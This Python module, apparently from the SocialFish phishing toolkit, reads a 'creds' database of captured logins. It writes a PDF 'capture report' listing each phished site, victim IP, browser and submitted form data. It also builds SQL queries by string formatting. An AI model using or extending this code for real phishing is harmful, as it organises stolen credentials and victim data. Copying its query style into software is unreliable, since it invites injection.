import os
from pylatex import Document, PageStyle, Head, Foot, MiniPage, \
    StandAloneGraphic, MultiColumn, Tabu, LongTabu, LargeText, MediumText, \
    LineBreak, NewPage, Tabularx, TextColor, simple_page_number, Command
from pylatex.utils import bold, NoEscape
from sqlite3 import connect
from ast import literal_eval
from time import strftime
from webbrowser import open_new

def generate_report(DATABASE, cpm):

    conex = connect(DATABASE)
    cursor = conex.cursor()
    list_urls = []
       
    for urls in cursor.execute('SELECT DISTINCT url FROM creds'): list_urls += urls
    _cURL = cpm
    choose_url = 'http' if _cURL == 'All' else _cURL
    result_query = []
    for row in cursor.execute('SELECT * FROM creds WHERE url GLOB "*{}*"'.format(choose_url)):
        result_query += row
        
    result_count = cursor.execute('SELECT COUNT(*) FROM creds WHERE url GLOB "*{}*"'.format(choose_url)).fetchone()
    
    return result_query, result_count

def generate_unique(DATABASE,cpm):
    geometry_options = {
        "head": "60pt",
        "margin": "0.5in",
        "bottom": "0.6in",
        "includeheadfoot": True
    }
    doc = Document(geometry_options=geometry_options)

    first_page = PageStyle("firstpage")

    with first_page.create(Head("L")) as header_left:
        with header_left.create(MiniPage(width=NoEscape(r"0.49\textwidth"),
                                         pos='c', align='L')) as logo_wrapper:
            logo_file = os.path.join(os.path.dirname(__file__),
                                     'SOCIALFISH_transparent.png')
            logo_wrapper.append(StandAloneGraphic(image_options="width=120px",
                                filename=logo_file))
    
    with first_page.create(Head("R")) as header_right:
        with header_right.create(MiniPage(width=NoEscape(r'0.49\textwidth'),
                                          pos='c', align='r')) as wrapper_right:
            wrapper_right.append(LargeText(bold('SOCIALFISH')))
            wrapper_right.append(LineBreak())
            wrapper_right.append(MediumText(bold('UNDEADSEC')))
            wrapper_right.append(LineBreak())
            wrapper_right.append(NoEscape(r'\today'))

    with first_page.create(Head('C')) as header_center:
        header_center.append('CAPTURE REPORT')

    with first_page.create(Foot("C")) as footer:
        message = "Important message please read"

    doc.preamble.append(first_page)

    with doc.create(Tabu("X[l] X[r]")) as first_page_table:
        customer = MiniPage(width=NoEscape(r"0.49\textwidth"), pos='h')
        
        branch = MiniPage(width=NoEscape(r"0.49\textwidth"), pos='t!',
                          align='r')

        first_page_table.add_row([customer, branch])
        first_page_table.add_empty_row()

    doc.change_document_style("firstpage")
    doc.add_color(name="lightgray", model="gray", description="0.80")

    with doc.create(LongTabu("X[15l]",
                             row_height=1.8)) as data_table:
        data_table.add_row(["Organization\nCapture IP\nBrowser\nLog\n"],
                           mapper=bold,
                           color="lightgray")
        data_table.add_empty_row()
        data_table.add_hline()

        result_query, result_count = generate_report(DATABASE,cpm)
        x = 0

        for i in range(result_count[0]):

            url = result_query[1+x].split('//')[1]
            ip = result_query[7+x]
            log_dict = literal_eval(result_query[2+x])
            
            if 'skstamp' in log_dict.keys():
                rm_trash = log_dict.pop('skstamp')
            elif 'utf8' in log_dict.keys():
                rm_trash = log_dict.pop('utf8')

            browser = result_query[4+x] + ' v' + result_query[5+x]
            x = 8*(i+1)

            row_tex = [url+'\n'+ip+'\n'+browser+'\n'+str(log_dict)+'\n']

            if (i % 2) == 0:
                data_table.add_row(row_tex, color="lightgray")
            else:
                data_table.add_row(row_tex)

    doc.append(NewPage())
    pdf_name = 'Report{}'.format(strftime('-%y%m'))
    doc.generate_pdf(pdf_name, clean_tex=False)
    open_new(os.getcwd()+'/'+pdf_name+'.pdf')
